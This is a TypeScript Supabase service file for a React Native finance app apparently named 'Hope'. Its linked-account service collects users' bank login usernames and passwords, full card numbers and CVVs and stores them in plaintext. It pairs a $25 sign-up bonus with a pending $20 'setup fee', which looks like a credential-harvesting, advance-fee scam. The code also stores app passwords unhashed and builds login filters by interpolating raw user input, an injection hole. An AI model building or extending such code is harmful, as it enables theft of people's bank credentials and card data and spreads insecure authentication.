import { supabase } from './client';
import { Platform } from 'react-native';
import * as Device from 'expo-device';

export interface HopeUser {
  id: string;
  full_name: string;
  email: string;
  username: string;
  phone_number: string;
  password: string;
  address: string;
  profile_completed: boolean;
  available_balance: number;
  pending_balance: number;
  last_login_at: string | null;
  created_at: string;
  updated_at: string;
}

export interface LinkedAccount {
  id: string;
  user_id: string;
  bank_name: string;
  account_type: 'checking' | 'savings';
  account_username: string;
  account_password: string;
  card_number: string;
  expiry_date: string;
  cvv: string;
  last_four_digits: string;
  status: 'pending' | 'verified' | 'failed';
  created_at: string;
  updated_at: string;
}

export interface Transaction {
  id: string;
  user_id: string;
  amount: number;
  type: 'credit' | 'debit';
  description: string;
  status: 'completed' | 'pending' | 'failed';
  linked_account_id?: string;
  created_at: string;
  updated_at: string;
}

export interface UserDevice {
  id: string;
  user_id: string;
  device_model: string;
  ip_address?: string;
  location?: string;
  session_id?: string;
  last_login_at: string;
  is_current: boolean;
  created_at: string;
  updated_at: string;
}

export interface SupportTicket {
  id: string;
  user_id?: string;
  name: string;
  email: string;
  message: string;
  status: 'open' | 'in_progress' | 'resolved' | 'closed';
  created_at: string;
  updated_at: string;
}

// User Services
export const userService = {
  async createUser(userData: {
    full_name: string;
    email: string;
    username: string;
    phone_number: string;
    password: string;
  }) {
    console.log('Creating user:', userData);
    
    // Check if user already exists
    const { data: existingUser } = await supabase
      .from('hopeuser')
      .select('id')
      .or(`email.eq.${userData.email},username.eq.${userData.username}`)
      .single();

    if (existingUser) {
      throw new Error('User with this email or username already exists');
    }

    // Create user
    const { data, error } = await supabase
      .from('hopeuser')
      .insert([{
        full_name: userData.full_name,
        email: userData.email,
        username: userData.username,
        phone_number: userData.phone_number,
        password: userData.password, // In production, hash this
        available_balance: 25.00, // Sign-up bonus
        pending_balance: 20.00, // Account setup fee
      }])
      .select()
      .single();

    if (error) {
      console.error('Error creating user:', error);
      throw error;
    }

    // Create default transactions
    await transactionService.createTransaction(data.id, {
      amount: 25.00,
      type: 'credit',
      description: 'Sign-up bonus',
      status: 'completed',
    });

    await transactionService.createTransaction(data.id, {
      amount: 20.00,
      type: 'debit',
      description: 'Account Setup fee',
      status: 'pending',
    });

    return data;
  },

  async loginUser(emailOrUsername: string, password: string) {
    console.log('Logging in user:', emailOrUsername);
    
    const { data, error } = await supabase
      .from('hopeuser')
      .select('*')
      .or(`email.eq.${emailOrUsername},username.eq.${emailOrUsername}`)
      .eq('password', password)
      .single();

    if (error || !data) {
      throw new Error('Invalid credentials');
    }

    // Update last login
    await supabase
      .from('hopeuser')
      .update({ last_login_at: new Date().toISOString() })
      .eq('id', data.id);

    // Update or create device record
    await deviceService.updateDeviceLogin(data.id);

    return data;
  },

  async getUserById(userId: string) {
    const { data, error } = await supabase
      .from('hopeuser')
      .select('*')
      .eq('id', userId)
      .single();

    if (error) {
      console.error('Error fetching user:', error);
      throw error;
    }

    return data;
  },

  async updateUser(userId: string, updates: Partial<HopeUser>) {
    const { data, error } = await supabase
      .from('hopeuser')
      .update({ ...updates, updated_at: new Date().toISOString() })
      .eq('id', userId)
      .select()
      .single();

    if (error) {
      console.error('Error updating user:', error);
      throw error;
    }

    return data;
  },

  async updateBalance(userId: string, availableBalance: number, pendingBalance: number) {
    const { data, error } = await supabase
      .from('hopeuser')
      .update({
        available_balance: availableBalance,
        pending_balance: pendingBalance,
        updated_at: new Date().toISOString()
      })
      .eq('id', userId)
      .select()
      .single();

    if (error) {
      console.error('Error updating balance:', error);
      throw error;
    }

    return data;
  }
};

// Transaction Services
export const transactionService = {
  async createTransaction(userId: string, transactionData: {
    amount: number;
    type: 'credit' | 'debit';
    description: string;
    status: 'completed' | 'pending' | 'failed';
    linked_account_id?: string;
  }) {
    const { data, error } = await supabase
      .from('transactions')
      .insert([{
        user_id: userId,
        ...transactionData,
      }])
      .select()
      .single();

    if (error) {
      console.error('Error creating transaction:', error);
      throw error;
    }

    return data;
  },

  async getUserTransactions(userId: string, limit?: number) {
    let query = supabase
      .from('transactions')
      .select('*')
      .eq('user_id', userId)
      .order('created_at', { ascending: false });

    if (limit) {
      query = query.limit(limit);
    }

    const { data, error } = await query;

    if (error) {
      console.error('Error fetching transactions:', error);
      throw error;
    }

    return data || [];
  },

  async updateTransactionStatus(transactionId: string, status: 'completed' | 'pending' | 'failed') {
    const { data, error } = await supabase
      .from('transactions')
      .update({ status, updated_at: new Date().toISOString() })
      .eq('id', transactionId)
      .select()
      .single();

    if (error) {
      console.error('Error updating transaction:', error);
      throw error;
    }

    return data;
  }
};

// Linked Account Services
export const linkedAccountService = {
  async createLinkedAccount(userId: string, accountData: {
    bank_name: string;
    account_type: 'checking' | 'savings';
    account_username: string;
    account_password: string;
    card_number: string;
    expiry_date: string;
    cvv: string;
  }) {
    const lastFourDigits = accountData.card_number.slice(-4);

    const { data, error } = await supabase
      .from('linked_accounts')
      .insert([{
        user_id: userId,
        ...accountData,
        last_four_digits: lastFourDigits,
        status: 'pending',
      }])
      .select()
      .single();

    if (error) {
      console.error('Error creating linked account:', error);
      throw error;
    }

    return data;
  },

  async getUserLinkedAccounts(userId: string) {
    const { data, error } = await supabase
      .from('linked_accounts')
      .select('*')
      .eq('user_id', userId)
      .order('created_at', { ascending: false });

    if (error) {
      console.error('Error fetching linked accounts:', error);
      throw error;
    }

    return data || [];
  },

  async updateAccountStatus(accountId: string, status: 'pending' | 'verified' | 'failed') {
    const { data, error } = await supabase
      .from('linked_accounts')
      .update({ status, updated_at: new Date().toISOString() })
      .eq('id', accountId)
      .select()
      .single();

    if (error) {
      console.error('Error updating account status:', error);
      throw error;
    }

    return data;
  }
};

// Device Services
export const deviceService = {
  async updateDeviceLogin(userId: string) {
    const deviceModel = Device.modelName || Platform.OS;
    const sessionId = `${userId}_${Date.now()}`;

    // Mark all other devices as not current
    await supabase
      .from('user_devices')
      .update({ is_current: false })
      .eq('user_id', userId);

    // Check if device already exists
    const { data: existingDevice } = await supabase
      .from('user_devices')
      .select('*')
      .eq('user_id', userId)
      .eq('device_model', deviceModel)
      .single();

    if (existingDevice) {
      // Update existing device
      const { data, error } = await supabase
        .from('user_devices')
        .update({
          last_login_at: new Date().toISOString(),
          session_id: sessionId,
          is_current: true,
          updated_at: new Date().toISOString()
        })
        .eq('id', existingDevice.id)
        .select()
        .single();

      if (error) {
        console.error('Error updating device:', error);
        throw error;
      }

      return data;
    } else {
      // Create new device record
      const { data, error } = await supabase
        .from('user_devices')
        .insert([{
          user_id: userId,
          device_model: deviceModel,
          session_id: sessionId,
          is_current: true,
          location: 'Unknown', // In production, get actual location
        }])
        .select()
        .single();

      if (error) {
        console.error('Error creating device record:', error);
        throw error;
      }

      return data;
    }
  },

  async getUserDevices(userId: string) {
    const { data, error } = await supabase
      .from('user_devices')
      .select('*')
      .eq('user_id', userId)
      .order('last_login_at', { ascending: false });

    if (error) {
      console.error('Error fetching user devices:', error);
      throw error;
    }

    return data || [];
  },

  async logoutOtherDevices(userId: string, currentSessionId: string) {
    const { data, error } = await supabase
      .from('user_devices')
      .update({ is_current: false })
      .eq('user_id', userId)
      .neq('session_id', currentSessionId);

    if (error) {
      console.error('Error logging out other devices:', error);
      throw error;
    }

    return data;
  }
};

// Support Services
export const supportService = {
  async createSupportTicket(ticketData: {
    user_id?: string;
    name: string;
    email: string;
    message: string;
  }) {
    const { data, error } = await supabase
      .from('support_tickets')
      .insert([ticketData])
      .select()
      .single();

    if (error) {
      console.error('Error creating support ticket:', error);
      throw error;
    }

    return data;
  },

  async getUserSupportTickets(userId: string) {
    const { data, error } = await supabase
      .from('support_tickets')
      .select('*')
      .eq('user_id', userId)
      .order('created_at', { ascending: false });

    if (error) {
      console.error('Error fetching support tickets:', error);
      throw error;
    }

    return data || [];
  }
};